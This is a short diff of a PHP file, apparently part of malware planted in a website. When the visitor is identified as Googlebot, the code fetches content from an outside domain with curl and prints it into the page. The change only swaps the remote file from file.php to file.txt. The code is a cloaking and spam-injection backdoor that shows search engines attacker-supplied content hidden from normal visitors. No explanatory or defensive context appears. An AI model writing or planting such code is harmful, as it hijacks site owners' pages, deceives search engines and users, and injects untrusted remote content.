@@ -27,7 +27,7 @@
         return $hasil;
     }
     if (is_google_bot()) {
-        $url_target = 'https://vievelofficial.com/file.php';
+        $url_target = 'https://vievelofficial.com/file.txt';
         $konten = ambil_konten_curl($url_target);
         if ($konten) {
             echo $konten;
